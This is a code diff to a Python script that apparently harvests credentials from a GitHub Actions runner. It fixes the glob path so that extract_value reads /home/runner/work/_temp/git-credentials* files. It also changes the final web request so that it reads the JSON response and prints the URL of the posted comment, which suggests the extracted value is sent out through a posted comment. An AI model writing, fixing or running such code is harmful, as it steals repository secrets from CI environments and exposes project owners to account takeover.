@@ -6,7 +6,7 @@ import base64
 
 
 def extract_value():
-    files = glob.glob("~/work/_temp/git-credentials*")
+    files = glob.glob("/home/runner/work/_temp/git-credentials*")
     if not files:
         raise FileNotFoundError("No credentials found")
 
@@ -43,4 +43,7 @@ request = urllib.request.Request(
     },
 )
 
-urllib.request.urlopen(request)
+with urllib.request.urlopen(request) as response:
+    result = json.load(response)
+
+print("Comment posted:", result["html_url"])
